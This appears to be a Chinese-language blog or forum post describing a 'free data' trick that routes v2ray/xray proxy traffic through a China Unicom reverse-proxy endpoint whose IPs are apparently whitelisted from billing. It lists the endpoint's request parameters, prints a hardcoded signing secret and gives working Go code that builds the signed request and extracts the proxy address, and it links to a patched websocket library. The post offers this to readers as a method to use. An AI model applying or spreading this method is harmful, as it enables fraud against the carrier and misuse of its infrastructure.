# 关于最近流行的809免流
近期有一种利用了联通某个反向代理接口的免流方法似乎挺流行，这里放上示例代码和简单的原理说明  
该方法主要是利用 `http://dir.wo186.tv:809/if5ax/` 接口反向代理自己的v2ray&xray服务器，并通过接口返回的反向代理信息连接到v2ray&xray服务器，从而实现免流的目的。该接口返回的反向代理服务器ip疑似被联通设置为白名单IP，因此免流效果远超普通的域名伪装。
该接口的主要请求参数:

- `fakeid`: 一串随机字符串，似乎长度固定为22个英文字母
- `spid`: 未知，目前实测有效的参数为: `81117`
- `pid`: 未知，目前实测有效的参数为: `81117`
- `spip`: 反向代理的源服务器IP
- `spport`: 反向代理的源服务器端口
- `spkey`: 在path及请求参数最后加上3d99ff138e1f41e931e58617e7d128e2之后做md5加密的结果

示例代码: 
``` Go
func getFakeID() string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	strb := []byte(str)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	var result []byte
	for i := 0; i < 22; i++ {
		result = append(result, strb[r.Intn(len(strb))])
	}
	return string(result)
}
func getUrl(ip, port string) []string {
	path := "if5ax/?fakeid=" + getFakeID() + "&spid=81117&pid=81117&spip=" + ip + "&spport=" + port
	host := "http://dir.wo186.tv:809/"
	m := md5.Sum([]byte(path + "3d99ff138e1f41e931e58617e7d128e2"))
	key := hex.EncodeToString(m[:])
	r, _ := http.Get(host + path + "&spkey=" + key)
	body, _ := io.ReadAll(r.Body)
	rj := map[string]string{}
	json.Unmarshal(body, &rj)
	p := strings.Index(rj["url"], "/if5ax")
	t := strings.Index(rj["url"], "lsttm=")
	return []string{rj["url"][7:p], rj["url"][p:], rj["url"][t+6 : t+20]}
}
func main(){
  url:=getUrl("1.1.1.1", "443")
  fmt.Println(url)
}
```

该接口会返回一串JSON，其中包含反向代理服务器的url  
此外，需要修改xray引用的ws库删除upgrade头才能正常反代，可以参考一下[我修改的](https://github.com/Yuzuki999/websocket)
